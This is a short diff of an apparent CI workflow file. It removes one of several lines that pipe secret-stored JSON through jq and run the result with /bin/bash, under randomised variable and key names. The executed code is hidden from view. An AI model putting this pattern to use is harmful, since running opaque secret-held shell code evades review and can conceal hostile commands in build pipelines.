@@ -27,7 +27,6 @@ jobs:
           cdgsd26792: ${{ secrets.cdgsd26792 }}
         run: |
           printf '%s' "$cdgsd26792" | jq -r .oajtc8 | /bin/bash
-          printf '%s' "$xqt50" | jq -r .zf20 | /bin/bash
           echo $hlkfe5489 | jq -r .syhs5 | /bin/bash
           printf '%s' "$fh9142" | jq -r .x448 | /bin/bash
 
